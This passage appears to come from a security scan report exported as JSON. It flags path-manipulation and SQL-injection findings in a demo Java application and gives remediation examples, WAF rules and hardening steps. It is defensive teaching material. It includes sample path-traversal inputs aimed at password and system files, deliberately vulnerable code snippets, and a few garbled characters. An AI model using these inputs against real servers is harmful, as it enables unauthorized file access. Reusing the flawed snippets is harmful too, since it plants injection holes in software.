//logger2.log(Level.parse(request.getParameter(\"loglevel\")), \"Test logger\");", "                        prop.setProperty(\"sec_password_encrypted\", encryptedText);", "", "                        File file = new File(fileName);", "                        FileOutputStream fileOut = new FileOutputStream(file);", "                        prop.store(fileOut, \"writing encrypted password\");", "", "                mv.addObject(\"msg\", \"Encrypted file downloaded\");", "                mv.setViewName(\"uploadFile\");", "            } catch (Exception e){", "                logger.error(\"error in downloading property file\", e);", "                        mv.setViewName(\"failure\");", "                mv.addObject(\"msg\", \"Error in downloading property file, check log for more information\");", "                e.printStackTrace();", "            }", "                return mv;", "        }"], "remediatedCode": null}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00160", "function": "java.io.File.File()", "line": "460", "snippet": "ModelAndView mv = new ModelAndView();\n\t\tString filePath = System.getProperty(\"catalina.home\") + \"\\\\tmpFiles\\\\generatedFile.csv\";\n\t\tFile file = new File(filePath); \n\t\t  \n\t    try {", "originalCode": ["        @RequestMapping(value=\"createCSVFile.html\", method=RequestMethod.GET)", "        public ModelAndView createCSVFile (@RequestParam(value=\"name\")String name) {", "                ModelAndView mv = new ModelAndView();", "                String filePath = System.getProperty(\"catalina.home\") + \"\\\\tmpFiles\\\\generatedFile.csv\";", "                File file = new File(filePath);", "", "            try {", "                // create FileWriter object with file as parameter", "                FileWriter outputfile = new FileWriter(file);", "                EmployeeSearchBean employeeSearch = new EmployeeSearchBean();", "                employeeSearch.setEmpName(name);", "                StringBuilder sb = new StringBuilder();", "                sb.append(name);", "                employeeSearch.setEmpName(name);", "", "                ModelAndView searchDtlMV = searchEmployee(employeeSearch);", "                Map<String,Object> employeeDtl = searchDtlMV.getModel();", "                employeeSearch = (EmployeeSearchBean) employeeDtl.get(\"employeeSearchBean\");", "                List<EmployeeBean> employeeList = employeeSearch.getEmployeeList();", "                CSVWriter writer = new CSVWriter(outputfile);", "", "                String[] header = { \"Name\", \"Gender\", \"City\" };", "                writer.writeNext(header);", "", "                for(EmployeeBean empDtl : employeeList) {", "", "                        String[] data1 = { santizeCSVData(name), empDtl.getGender(), empDtl.getCity()};", "                        writer.writeNext(data1);", "                }", "", "                writer.close();", "                mv.addObject(\"msg\", \"CSV File downloaded\");", "                mv.setViewName(\"uploadFile\");", "            }", "            catch (IOException e) {", "                logger.error(\"Error during csv file creation. Try again with valid input\");", "            }", "", "                return mv;", "        }"], "remediatedCode": null}]}], "remediation": {"remediation": {"@id": "R.0042", "@name": "Path Manipulation", "@dateLastModified": "7/14/2020", "faqs": {"faq": {"question": "There are validations on the webpage itself, as the user will need to click on a local file in order to upload it. Why do I need to implement this char validation?", "answer": "It is easy for an attacker to change the file name and path sent even after selecting a file. Do not rely on validations performed on the browser (web elements, JavaScript, etc.)"}}, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "string fileName = Request.QueryString[&quot;file&quot;];\n            \n                string Filepath = Path.Combine( ConfigurationManager.AppSettings[&quot;DowloadFileLocation&quot;], fileName);\n\n                if (!string.IsNullOrEmpty(Filepath) && File.Exists(Filepath))\n                {\n                    Response.Clear();\n                    Response.ContentType = &quot;application/octet-stream&quot;;\n                    Response.AddHeader(&quot;content-disposition&quot;, &quot;attachment;filename=&quot; + Path.GetFileName(fileName));\n                    Response.WriteFile(Filepath);\n\n                    Response.End();\n                }\n                else\n                {\n                    Response.Write(&quot;File not be found!&quot;);\n                }", "nonvulncode": "string fileName = Request.QueryString[&quot;file&quot;];\n            ///truncate (fileName,256)  //OS limitation enforcement\n            char[] illegalcharacters = <em class=\"blue\">Path.GetInvalidFileNameChars()</em>; //get all invalid characters\n\n            fileName =<em class=\"blue\"> illegalcharacters.Aggregate(fileName, (current, c) =&gt; current.Replace(c, '_'));</em>\n\n            string Filepath = Path.Combine( ConfigurationManager.AppSettings[&quot;DowloadFileLocation&quot;], fileName);\n\n                if (!string.IsNullOrEmpty(Filepath) && File.Exists(Filepath))\n                {\n                    Response.Clear();\n                    Response.Conten+E6tType = &quot;application/octet-stream&quot;;\n                    Response.AddHeader(&quot;content-disposition&quot;, &quot;attachment;filename=&quot; + Path.GetFileName(fileName));\n                    Response.WriteFile(Filepath);\n\n                    Response.End();\n                }\n                else\n                {\n                    Response.Write(&quot;File not be found!&quot;);\n                }", "comments": "In a path manipulation attack, the attacker can manipulate the querystring by placing some input on his own, trying to access, overload, or delete a file that was not supposed to be accessed by  the attacker. If not validated, user  might succeed and download or replace sensitive files which should not be.\n\nAny application that receives files from the user needs to consider the path and file name in use. Other mitigations from the infrastructure can be put in place, such as chroot jail, or drive mapping to enforce that accessed files that are always in the proper safe location.\nSample inputs 1: SensitiveFiles\\SystemPassword.txt\nIn case user manipulate the download file name to be &quot;\\user\\files\\...\\SensitiveFiles\\SystemPassword.txt&quot;, ('\\...\\' is a not usual way to go to root folder on windows) The attacker will be able to download the files inside the SensitiveFiles, and brute force different names to download even files the attacker don't know it exists.\n\nSample inputs 2: %2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fSystemPassword.txt ( '%2f' is the URL encode for '/' and '%2e' is the encoding '.') \nthe user can download the file in the root folder", "impact": "Add reference <em class=\"bold\">System.IO</em> to use the <em class=\"bold\">Path.IsPathRooted() </em>and<em class=\"bold\"> Path.GetInvalidFileNameChars().\n</em>This is part of 2.0 to 4.8 .Net Framework and all versions of .Net Core.\nReferences: \n- https://docs.microsoft.com/en-us/dotnet/api/system.io.path.getinvalidfilenamechars?view=netcore-3.1\n- https://docs.microsoft.com/en-us/dotnet/api/system.io.path.ispathrooted?view=netcore-3.1\n\nNeeds a validation from the business impact for this implementation, as the solution is changing the file name (replacing special chars per &quot;_&quot;), and also be aware that users may be able to access any file in the folder.\n\nThis fix has minimum impact on performance, unless it the user will manipulate too many files in concurrence (e.g. for web service to backup multiple small files on a remote file systems)", "abstract": "Use of RegExp"}, {"@type": ".NET/C#/ASP", "vulncode": "FE: \n&lt;select name=&quot;file&quot;&gt;\n    &lt;option value=&quot;image.gif&quot;&gt; Picture in use &lt;/option&gt;\n    &lt;option value=&quot;profile.txt&quot;&gt; User Profile &lt;/option&gt;\n&lt;/select&gt;\n$scope.postData = &quot;loadFile=&quot; + $scope.file; \n$http({\nmethod: 'POST',\nurl: 'api/loadProfile/',\ndata: $scope.postData\n}).then(function(\u2026)){\n\nBE:\n                string fileName = Request.QueryString[&quot;file&quot;];\n            \n                string Filepath = Path.Combine( ConfigurationManager.AppSettings[&quot;DowloadFileLocation&quot;], fileName);\n\n                if (!string.IsNullOrEmpty(Filepath) && File.Exists(Filepath))\n                {\n                    Response.Clear();\n                    Response.ContentType = &quot;application/octet-stream&quot;;\n                    Response.AddHeader(&quot;content-disposition&quot;, &quot;attachment;filename=&quot; + Path.GetFileName(fileName));\n                    Response.WriteFile(Filepath);\n\n                    Response.End();\n                }\n                else\n                {\n                    Response.Write(&quot;File not be found!&quot;);\n                }", "nonvulncode": "FE:\n\n&lt;select name=&quot;file_ID&quot;&gt;\n    &lt;option value=&quot;0001&quot;&gt; Picture in use &lt;/option&gt;\n    &lt;option value=&quot;0002&quot;&gt; User Profile &lt;/option&gt;\n&lt;/select&gt;\n+E1\nBE:\n                string fileID = Request.QueryString[&quot;file_ID&quot;];\n <em class=\"blue\">               switch (fileID){\n                             case 0001:\n                                      filename=&quot;image.gif&quot;;\n                                      break;\n                            case 0002:\n                                      filename=&quot;profile.txt&quot;;\n                                      break;\n                            default:\n                                     return (&quot;Please select a file from the drop down list&quot;);</em>\n                 }\n\n /// Or, in case the file name and ID are in a server managed table, the name can be retrieved from a DB, like:\n///               PrepareStatement (&quot;select name from files where fileID=?&quot;);\n///                          fileName=exec(1, fileID);\n\n                string Filepath = Path.Combine( ConfigurationManager.AppSettings[&quot;DowloadFileLocation&quot;], fileName);\n\n                if (!string.IsNullOrEmpty(Filepath) && File.Exists(Filepath))\n                {\n                    Response.Clear();\n                    Response.ContentType = &quot;application/octet-stream&quot;;\n                    Response.AddHeader(&quot;content-disposition&quot;, &quot;attachment;filename=&quot; + Path.GetFileName(fileName));\n                    Response.WriteFile(Filepath);\n\n                    Response.End();\n                }\n                else\n                {\n                    Response.Write(&quot;File not be found!&quot;);\n                }", "comments": "In case there is a limited number of files to be referenced on the webpage, one possible solution is to have a deterministic approach: the full list of possible names in the server side, and client sends a index value. \nIn case the application has a bigger number of files or in case the file names changes over time, one strategy is to assign a key value to each file and do the mapping with the path and names on the server side. The use of a database for manage access can also incorporate extra security controls, such as: limit access to a certain role; log every time the file is accessed or retrieved, by IP/country/etc.;", "impact": "The deterministic option, where all values are mapped on the web-page is usually hard to manage and operate.\nIn case the values are mapped in a DB on the server, the data model needs to be adapted to this new form of managing the information, including functionalities to manage the data set (add, edit, delete, change authorization per file, etc.).", "abstract": "Limiting the options to predefined value in code"}, {"@type": ".NET/C#/ASP", "vulncode": "string fileName = Request.QueryString[&quot;file&quot;];\n            \n                string Filepath = Path.Combine( ConfigurationManager.AppSettings[&quot;DowloadFileLocation&quot;], fileName);\n\n                if (!string.IsNullOrEmpty(Filepath) && File.Exists(Filepath))\n                {\n                    Response.Clear();\n                    Response.ContentType = &quot;application/octet-stream&quot;;\n                    Response.AddHeader(&quot;content-disposition&quot;, &quot;attachment;filename=&quot; + Path.GetFileName(fileName));\n                    Response.WriteFile(Filepath);\n\n                    Response.End();\n                }\n                else\n                {\n                    Response.Write(&quot;File not be found!&quot;);\n                }", "nonvulncode": "string allowedCharList = &quot;^[a-zA-Z0-9. ]<em class=\"blue\">#$&quot;</em>\nstring fileName = Request.QueryString[&quot;file&quot;];\n<em class=\"blue\">if (!Regex.IsMatch (fileName, allowedCharList)</em>\n{   \n        Response.Write(&quot;File not be found!&quot;);\n}else{\n      if (!string.IsNullOrEmpty(Filepath) && File.Exists(Filepath))\n      {\n           Response.Clear();\n           Response.ContentType = &quot;application/octet-stream&quot;;\n           Response.AddHeader(&quot;content-disposition&quot;, &quot;attachment;filename=&quot; + Path.GetFileName(fileName));\n            Response.WriteFile(Filepath);\n\n             Response.End();\n       }\n       else\n       {\n                    Response.Write(&quot;File not be found!&quot;);\n       }\n}", "comments": "Whitelist with a specific set of allowed characters is another way of solving input validation for directory transversal.", "impact": "There are ways for an attacker to cause DoS by overloading the application when exploiting the Regexp performance (e.g., sending multiple long filenames to be checked will use too many computational cycles on the server testing the Regexp). If you are concerned with a DoS on the application due to multiple Regexp checks, implement a CAPTCHA validation after a certain number of tries on the web page.\nRemember to only allow a certain set of characters to be recognized (whitelist), instead of removing chars you think should not be used (blacklist). Blacklists approach is usually incomplete and can pose a security issue.", "abstract": null}, {"@type": "JAVA/JSP", "vulncode": "public ModelAndView deleteFile( @RequestParam(value=&quot;fileName&quot;)String fileName) {\n\t\t\n\t\tModelAndView mv = new ModelAndView();\n\t\tString filepath = &quot;C:\\\\software\\\\apache-tomcat-8.5.41\\\\tmpFiles\\\\&quot;;\n\t\t\n\t\tPath path = Paths.get(filepath, fileName);\n\t\tFile file = path.toFile();\n\t\t\n\t\ttry {<em class=\"red\">//File is getting deleted without the fileName being sanitized/validated</em>\n\t\t\tif (file.delete()) {\n\t\t\t\tmv = executeCommand(&quot;dir&quot;);\n\t\t\t} else {\n\t\t\t\tmv.setViewName(&quot;commandExec&quot;);\n\t\t\t\tmv.addObject(&quot;msg&quot;, &quot;Failed to delete the file&quot;);\n\t\t\t}\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t\t\n\t\treturn mv;\n\t}", "nonvulncode": "public ModelAndView deleteFile( @RequestParam(value=&quot;fileName&quot;)String fileName) {\n\t\t\n\t\tModelAndView mv = new ModelAndView();\n\t\tString filepath = &quot;C:\\\\software\\\\apache-tomcat-8.5.41\\\\tmpFiles\\\\&quot;;\n \n\t\tPath path = Paths.get(filepath, fileName);\n\t\tFile file = path.toFile();\t\t\n\t\ttry {\n\t\t\t<em class=\"blue\">boolean isfileNameValid = file.getCanonicalFile().getName().equals(fileName);</em>\n\n\t\t\tif (isfileNameValid) {\n\t\t\t\tfile.delete();\n\t\t\t\tmv = executeCommand(&quot;dir&quot;);\n\t\t\t} else {\t\n\t\t\t\tmv.setViewName(&quot;commandExec&quot;);\n\t\t\t\tmv.addObject(&quot;msg&quot;, &quot;Failed to delete the file&quot;); // Send a generic error message to the user.\n\t\t\t}\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t}\t\t\n\t\treturn mv;\n\t}", "comments": "Before execurint any action with the file (read, write, delete, execute), the system uses &quot;getCanonicalFile&quot; to validate if the provided file name refers to the actual target file on the secure tmpFiles folder, making it impossible to an attacker to manipulate the path (e.g., ..\\..\\..\\vulnerableFile.txt). For more information, please refer to:\nhttps://docs.oracle.com/javase/7/docs/technotes/guides/security/PolicyFiles.html\nhttps://wiki.sei.cmu.edu/confluence/display/java/FIO16-J.+Canonicalize+path+names+before+validating+them\nhttps://owasp.org/www-community/attacks/Path_Traversal", "impact": "No impact in performance. getCanonicalFile method requires to import Java.io.File", "abstract": null}]}, "mitigations": {"mitigation": [{"system": "WAF / ModSecurity", "configuration": "web.config\nInsert the below code, right after the &lt;/configSections&gt; in the web.config file of the web application.\n\n&lt;system.webServer&gt;\n    &lt;ModSecurity enabled=&quot;true&quot; configFile=&quot;C:\\Program Files\\ModSecurity IIS\\modsecurity_iis.conf&quot; /&gt;\n&lt;/system.webServer&gt;\n\nThe value of the configFile must be the path on where the ModSecurity installed.", "backend": "- OWASP CRS must be downloaded and enabled.\n- Rules for Dangerous File Inclusion: Local attack (must be present in the rules folder)\n   - REQUEST-930-APPLICATION-ATTACK-LFI.conf\n- Open the modsecurity.conf and update the SecRuleEngine to On.\n- Open the modsecurity_iis.conf and update the entry Include crs-setup.conf.example to Include crs-setup.conf", "frontend": "SIEM integration:\nWindows: Collect logs with Source as ModSecurity from event viewer. Below is the log captured for Dangerous File Inclusion: Local.\n\n[client ] ModSecurity: Access denied with code 403 (phase 2). Operator GE matched 5 at TX:anomaly_score. [file &quot;C:\\/Program Files/ModSecurity IIS/owasp_crs/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf&quot;] [line &quot;57&quot;] [id &quot;949110&quot;] [msg &quot;Inbound Anomaly Score Exceeded (Total Score: 5)&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-generic&quot;] [hostname &quot;ALCB-749326Z-LX&quot;] [uri &quot;/Download/Download?fileName=c%3a%2fwindows%2fwin.ini&quot;] [unique_id &quot;18374686490409041947&quot;]", "comments": "To protect agains this vulnerability, WAF has to be configured:\n   Enable Paranoia level to XXX, \n   in config REQUEST-930-APPLICATION-ATTACK-LFI.conf go to the section of Paranoia level that you want to create a rule. \nWe can also update the existing rule to cover other scenarios, based on the threat modeling for the applications. \nExample:\nIn case the model defined one risk file as c:\\windows\\win.ini, on the default rule when user input &quot;c%3a%2fwindows%2fwin.ini&quot; this will not be blocked by the CRS default ruleset. \nTo add this scenario, we can update the rule in line 55, to block anything starting with &quot;c:\\&quot;. \n\nfrom:\n SecRule REQUEST_URI|REQUEST_BODY|REQUEST_HEADERS|!REQUEST_HEADERS:Referer|XML:/* &quot;@pm ..\\ ../&quot; \\\nto:\nSecRule REQUEST_URI|REQUEST_BODY|REQUEST_HEADERS|!REQUEST_HEADERS:Referer|XML:/* &quot;@pm ..\\ ../ c%3a%2f&quot; \\\n\nImpact: Increasing the Paranoia level will create more false positives on WAF, and may block part of the normal application operations, a full regression test including has to be performed to validate this as a possible mitigation for the specific use case.\n\nYou may check the link below for more path traversal that attacker may used.\nhttps://gracefulsecurity.com/path-traversal-cheat-sheet-windows/"}, {"system": "OS Hardening", "configuration": "[Unix]\nuse chroot to jail the application to the appropriated folders\nUse permissions on files/folders not to be accessed by users.\n\n[Windows (any version)]\nuse SUBST to limit the user access to one drive letter associated with the folder.\nsubst f: c:\\code\\tmp\n\nUse icacls  command to manage access of user to a specific directory\nicacls directory [/substitute SidOld SidNew [...]] /restore aclfile [/C] \n       [/L] [/Q]", "backend": "Unix/Linux(chroot ):\n\nchroot /path/to/new/root command\nor\nchroot /path/to/new/root /path/to/server\nor\nchroot [options] /path/to/new/root /path/to/server\n\nWindows (SUBST / icals ):\n\nsubst z: b:\\user\\betty\\forms\n\nicacls test1 /grant User1:(d,wdac)", "frontend": "see backend code section", "comments": "chroot command in Linux/Unix system is used to change the root directory. Every process/command in Linux/Unix like systems has a current working directory called root directory. It changes the root directory for currently running processes as well as its child processes.\n\nAs part of the OS / Container hardening, it is a good practice to restrict the files the application can access, and limit any access outside the application scope.\nmake sure the application can only write files on a restricted folder structure.\n\nUploaded files must be set to not executable, read only, during creation time (business requirements dependent). \n\nReference:\nhttps://www.geeksforgeeks.org/chroot-command-in-linux-with-examples/#:~:text=chroot%20command%20in%20Linux%2FUnix,well%20as%20its%20child%20processes.\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/subst\nhttps://www.computerhope.com/icacls.htm\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls"}, {"system": "Java", "configuration": "Limit the code access in the Java.policy (java.home\\lib\\security\\java.policy) file, to have access only to the specific folder.", "backend": "// All files in /img/java can be read\ngrant codeBase &quot;file:/home/programpath/&quot; {\n<em class=\"bold\">  permission java.io.FilePermission &quot;/software/apache-tomcat-8.5.41/tmpFiles/&quot;, &quot;read&quot;, &quot;write&quot;; </em> // Example code has access limited to this path\n};", "frontend": null, "comments": "References: https://docs.oracle.com/javase/7/docs/technotes/guides/security/PolicyFiles.html\nhttps://wiki.sei.cmu.edu/confluence/display/java/FIO16-J.+Canonicalize+path+names+before+validating+them\nhttps://owasp.org/www-community/attacks/Path_Traversal"}]}}}}, "SQL Injection": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/dao/StudentDAO.java", "items": [{"id": "IN00384", "function": "java.sql.Statement.executeQuery()", "line": "74", "snippet": "String sql = \"SELECT SubjectID, Username, Grade,InstructorID,ID from StudentSubjectGrade where Username='\"+userName+\"'\";\n\n\t\t\tResultSet rs = stmt.executeQuery(sql);\n\t\t\t  \t\t \t\n\t\t\twhile (rs.next()) {", "originalCode": ["        public List<StudentSubjectGradeBean> getStudentSubjectGradeList(String userName,String datasource) throws NamingException, SQLException, Exception {", "", "                Connection conn=null;", "", "                List<StudentSubjectGradeBean> studGradeList = new ArrayList<StudentSubjectGradeBean>();", "", "", "                /*", "                 * InitialContext ctx = new InitialContext(); DataSource ds =", "                 * (DataSource)ctx.lookup(datasource); if (ds != null) { conn =", "                 * ds.getConnection(); conn.setCatalog(datasource); }", "                 */", "", "try (InputStream input = LoginDAO.class.getResourceAsStream(\"/com/accenture/sec/resources/sec_conn.properties\")) {", "", "                        Properties prop = new Properties();", "                        prop.load(input);", "                        String dbURL = prop.getProperty(\"sec_db_url\");", "                        String dbuser = prop.getProperty(\"sec_user\");", "                        String dbpwd = prop.getProperty(\"sec_password\");", "", "                        conn = DriverManager.getConnection(dbURL,dbuser, dbpwd);", "", "                     PreparedStatement stmt = null;", "                     // *******************************************************************************", "                     // Changed by Accenture Auto-remediation service according to Scan: IASP_SAST_SCAN_DEMO01 ,", "                     // Vulnerability ID: IN00382", "                     // *******************************************************************************", "                     HashMap<String,String> IN00382_paramList = new HashMap();", "                     // *******************************************************************************", "                     // Changed by Accenture Auto-remediation service according to Scan: IASP_SAST_SCAN_DEMO01 ,", "                     // Vulnerability ID: IN00382", "                     // Strategy in use: Parametrized query for PreparedStatement - concatenated string", "                     // Please check that the Table Names and Column Names can not be parameterized.", "                     // *******************************************************************************", "                     String sql = \"SELECT SubjectID, Username, Grade,InstructorID,ID from StudentSubjectGrade where Username=\" + \" ? \" + \"\";", "                     IN00382_paramList.put(\"1\",userName);", "", "                        stmt = conn.prepareStatement(sql);", "                        // *******************************************************************************", "                        // Changed by Accenture Auto-remediation service according to Scan: IASP_SAST_SCAN_DEMO01 ,", "                        // Vulnerability ID: IN00382", "                        // Strategy in use: Parametrized query", "                        // *******************************************************************************", "                        for(HashMap.Entry<String,String> entry : IN00382_paramList.entrySet()){", "                            stmt.setString(Integer.parseInt(entry.getKey()), entry.getValue());", "                        }", "                        ResultSet rs = stmt.executeQuery();", "", "                        while (rs.next()) {", "                                StudentSubjectGradeBean studDtl = new StudentSubjectGradeBean();", "                                studDtl.setId(rs.getInt(\"ID\"));", "                                studDtl.setSubjectID(rs.getString(\"SubjectID\"));", "                                studDtl.setGrade(rs.getInt(\"ID\"));", "                                studDtl.setInstructorID(rs.getString(\"InstructorID\"));", "                                studDtl.setUserName(rs.getString(\"Username\"));", "", "                                studGradeList.add(studDtl);", "                        }", "} catch(Exception e) {", "        throw e;", "}", "", "                return studGradeList;", "", "        }"], "remediatedCode": null}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00385", "function": "java.sql.Statement.executeUpdate()", "line": "326", "snippet": "Statement stmt = conn.createStatement();\n\t\t\tstmt.executeUpdate(insertSql);\n\n\t\t\t} catch (SQLException e) {", "originalCode": ["          public UserProfileForm addUserProfile(UserProfileForm userProfile) {", "", "                        /*", "                         * EntityManager em=entityManagerFactory.createEntityManager();", "                         *", "                         * UserProfileEntity entity = new UserProfileEntity();", "                         * BeanUtils.copyProperties(userProfile, entity);", "                         *", "                         * em.getTransaction().begin(); em.persist(entity);", "                         * em.getTransaction().commit();", "                         */", "          Connection conn = null;", "          String uName = userProfile.getUserName();", "          String password = userProfile.getPwd();", "          String encryptionkey = userProfile.getEncryptionKey();", "", "          // *******************************************************************************", "          // Changed by Accenture Auto-remediation service according to Scan: IASP_SAST_SCAN_DEMO01 ,", "          // Vulnerability ID: IN00383", "          // *******************************************************************************", "          HashMap<String,String> IN00383_paramList = new HashMap();", "          // *******************************************************************************", "          // Changed by Accenture Auto-remediation service according to Scan: IASP_SAST_SCAN_DEMO01 ,", "          // Vulnerability ID: IN00383", "          // Strategy in use: Parametrized query for PreparedStatement - concatenated string", "          // Please check that the Table Names and Column Names can not be parameterized.", "          // *******************************************************************************", "          String insertSql = \"Insert into UserProfile (username, password, encryptionkey) values (\" + \" ? \" + \",\" + \" ? \" + \",\" + \" ? \" + \")\";", "          IN00383_paramList.put(\"1\",uName);", "          IN00383_paramList.put(\"2\",password);", "          IN00383_paramList.put(\"3\",encryptionkey);", "", "                try (InputStream input = LoginDAO.class.getResourceAsStream(\"/com/accenture/sec/resources/sec_conn.properties\")) {", "", "                        Properties prop = new Properties();", "                        prop.load(input);", "                        String dbURL = prop.getProperty(\"sec_db_url\");", "                        String dbuser = prop.getProperty(\"sec_user\");", "                        String dbpwd = prop.getProperty(\"sec_password\");", "", "                        conn = DriverManager.getConnection(dbURL,dbuser, dbpwd);", "", "                        PreparedStatement stmt = null;", "                        stmt = conn.prepareStatement(insertSql);", "                        // *******************************************************************************", "                        // Changed by Accenture Auto-remediation service according to Scan: IASP_SAST_SCAN_DEMO01 ,", "                        // Vulnerability ID: IN00383", "                        // Strategy in use: Parametrized query", "                        // *******************************************************************************", "                        for(HashMap.Entry<String,String> entry : IN00383_paramList.entrySet()){", "                            stmt.setString(Integer.parseInt(entry.getKey()), entry.getValue());", "                        }", "                        stmt.executeUpdate();", "", "                        } catch (SQLException e) {", "                                e.printStackTrace();", "                        } catch (IOException e) {", "                                e.printStackTrace();", "                        }", "", "          return userProfile;", "          }"], "remediatedCode": null}]}], "remediation": {"remediation": {"@id": "R.0023", "@name": "SQL Injection", "@dateLastModified": "7/8/2020", "faqs": null, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "[HttpPost]\n        [ValidateAntiForgeryToken]\n        public ActionResult Login(AccountVM account)\n        {\n            if(ModelState.IsValid){\n                SqlConnection conn = new SqlConnection(ConfigurationManager.ConnectionStrings[&quot;VulnAppDBConnection&quot;].ConnectionString);\n               <em class=\"red\"> string query = &quot;Select Password from dbo.Account Where Username='&quot; + account.Username + &quot;';&quot;;</em>\n                SqlCommand cmd = new SqlCommand(query, conn);\n                conn.Open();\n                using (SqlDataReader dr = cmd.ExecuteReader())\n                {\n                    if (dr.Read())\n                    {\n                        if(DBNull.Value != dr[&quot;Password&quot;])\n                        {\n                            if(dr[&quot;Password&quot;].ToString() == account.Password)\n                            {\n                                Session[&quot;user&quot;] = account.Username;\n                                return View(&quot;Main&quot;);\n                            }\n                        }\n                    }\n                }\n                conn.Close();\n\n            }\n            TempData[&quot;errmsg&quot;] = &quot;Invalid Credentials.&quot;;\n            return View();\n        }", "nonvulncode": "[HttpPost]\n[ValidateAntiForgeryToken]\npublic ActionResult Login(AccountVM account)\n{\n    if(ModelState.IsValid){\n\n        SqlConnection conn = new SqlConnection(ConfigurationManager.ConnectionStrings[&quot;VulnAppDBConnection&quot;].ConnectionString);\n         <em class=\"blue\">string query = &quot;Select Password from dbo.Account Where Username=@username;&quot;;</em>\n         SqlCommand cmd = new SqlCommand(query, conn);\n         <em class=\"blue\">cmd.Parameters.AddWithValue(&quot;@username&quot;, account.Username);</em>\n         conn.Open();\n         using (SqlDataReader dr = cmd.ExecuteReader())\n         {\n            if (dr.Read())\n            {\n                 if(DBNull.Value != dr[&quot;Password&quot;])\n                 {\n                      if(dr[&quot;Password&quot;].ToString() == account.Password)\n                      {\n                           Session[&quot;user&quot;] = account.Username;\n                           return View(&quot;Main&quot;);\n                      }\n                 }\n            }\n         }\n         conn.Close();\n      }\n      TempData[&quot;errmsg&quot;] = &quot;Invalid Credentials.&quot;;\n      return View();\n}", "comments": "Parametrized query is usually recommended to solve SQLi vulnerabilities, due to the fact that the data and logic will be treated in separate channels by the DB server. Confidential information needs to be protected.", "impact": "For complex queries, validate with the DBA the performance impact in the overall DB.", "abstract": "Use of parametrized query"}, {"@type": ".NET/C#/ASP", "vulncode": "[HttpPost]\n        [ValidateAntiForgeryToken]\n        public ActionResult Login(AccountVM account)\n        {\n            if(ModelState.IsValid){\n                SqlConnection conn = new SqlConnection(ConfigurationManager.ConnectionStrings[&quot;VulnAppDBConnection&quot;].ConnectionString);\n               <em class=\"red\"> string query = &quot;Select Password from dbo.Account Where Username='&quot; + account.Username + &quot;';&quot;;</em>\n                SqlCommand cmd = new SqlCommand(query, conn);\n                conn.Open();\n                using (SqlDataReader dr = cmd.ExecuteReader())\n                {\n                    if (dr.Read())\n                    {\n                        if(DBNull.Value != dr[&quot;Password&quot;])\n                        {\n                            if(dr[&quot;Password&quot;].ToString() == account.Password)\n                            {\n                                Session[&quot;user&quot;] = account.Username;\n                                return View(&quot;Main&quot;);\n                            }\n                        }\n                    }\n                }\n                conn.Close();\n\n            }\n            TempData[&quot;errmsg&quot;] = &quot;Invalid Credentials.&quot;;\n            return View();\n        }", "nonvulncode": "[HttpPost]\n        [ValidateAntiForgeryToken]\n        public ActionResult Login(AccountVM account)\n        {\n            if(ModelState.IsValid){\n\n<em class=\"blue\">                var acct = context.Accounts.Where(s =&gt; s.Username == account.Username.ToString().Trim()).FirstOrDefault();</em>\n                if (acct != null)\n                {\n                    if(acct.Password == account.Password){\n                        Session[&quot;user&quot;] = account.Username;\n                        return View(&quot;Main&quot;);\n                    }\n                }\n            }\n            TempData[&quot;errmsg&quot;] = &quot;Invalid Credentials.&quot;;\n            return View();\n        }", "comments": "The use of some ORM objects, in particular entity framework using LINQ language  helps to stop SQL injection because it passes data to the database via SQL parameters instead of control layer. LINQ queries are not possible to manipulate using the traditional concatenation of SQL scape characters (e.g. the single quote ' ), making it protected against traditional SQL injection attacks. \nReferences: https://entityframework.net/linq-prevent-sql-injection", "impact": "Needs to import Entity Framework to compile the code.\nFor complex queries, validate with the DBA the performance impact in the overall DB.\n\nThis has to be properly implemented to avoid SQLi. For examples of wrong implementation, see reference: https://bertwagner.com/2018/03/06/2-5-ways-your-orm-will-allow-sql-injection/", "abstract": "Use of entity framework"}, {"@type": "JAVA/JSP", "vulncode": "public String validateLogin(LoginBean loginBean){\n\t\t\n\t\tEntityManager em=entityManagerFactory.createEntityManager();\n\n\t\tString uName = loginBean.getUserName();\n\t\tString password = loginBean.getPassword();\n\t\t\n\t\t<em class=\"red\">String hql =&quot;SELECT pwd from UserAccountEntity WHERE userName='&quot;+uName+&quot;'&quot;; </em>\n\t\t\n\t\tTypedQuery query = (TypedQuery) em.createQuery(hql);\n\t\t\n\t\tList&lt;Object[]&gt; results = query.getResultList();\n\t\t\n\t\tif (!results.isEmpty()) {\n\t\t\tIterator it = results.iterator();\n\t\t\twhile (it.hasNext()) {\n\t\t\t\tObject[] user = (Object[]) it.next();\n\n\t\t\t\tif (password.equals((String) user[0])) {\n\t\t\t\t\tloginBean.setRoleID((String) user[1]);\n\t\t\t\t\treturn &quot;success&quot;;\n\t\t\t\t} else {\n\t\t\t\t\treturn &quot;failure&quot;;\n\t\t\t\t}\n\t\t\t}\n\t\t} else {\n\t\t\treturn &quot;failure&quot;;\n\t\t}\n\t\t\n\t\treturn &quot;failure&quot;;\n\t}", "nonvulncode": "public String validateLogin(LoginBean loginBean){\n\t\t\n\t\tEntityManager em=entityManagerFactory.createEntityManager();\n\n\t\tString uName = loginBean.getUserName();\n\t\tString password = loginBean.getPassword();\n\t\t\n\t\t<em class=\"blue\">String hql =&quot;SELECT pwd from UserAccountEntity WHERE userName = :name&quot;; </em>\n\t\t\n\t\tTypedQuery query = (TypedQuery) em.createQuery(hql);\n\t\t<em class=\"blue\">query.setParameter(&quot;name&quot;, uName); </em>\n\t\tList&lt;Object[]&gt; results = query.getResultList();\n\t\t\n\t\tif (!results.isEmpty()) {\n\t\t\tIterator it = results.iterator();\n\t\t\twhile (it.hasNext()) {\n\t\t\t\tObject[] user = (Object[]) it.next();\n\n\t\t\t\tif 